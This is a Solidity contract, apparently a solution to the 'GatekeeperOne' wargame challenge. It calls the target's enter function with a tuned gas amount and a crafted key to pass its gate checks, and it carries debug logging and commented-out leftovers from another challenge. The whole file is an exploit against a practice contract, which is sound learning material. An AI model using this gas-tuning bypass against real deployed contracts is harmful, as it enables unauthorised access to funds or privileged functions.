// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract GK1Break {
    address payable gk1;

    constructor(address payable _gk1) public payable {
        gk1 = _gk1;
    }

    //8498, 9536, 785, 253, 8504, 8554 - 8604 //// 8558 /// 59 /// 8445 // 16636
    //bytes8 _key
    function enterGK1(bytes8 _key) public payable {
        console.log("tx.origin", tx.origin);
        console.log("uint16(tx.origin)", uint16(tx.origin));
        console.log("uint32(uint64(_gateKey))", uint32(uint64(_key)));
        console.log("uint64(_gateKey)", uint64(_key));
        // console.log("uint32(uint64(_key))", uint32(uint64(_key)));
        GatekeeperOne(gk1).enter.gas(24827)(_key);
        // (bool success, ) = king.call.value(msg.value)("");
        // require(success, "Ether send failed!");
    }

    // receive() external payable {
    //     require(msg.sender == 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    // }
}
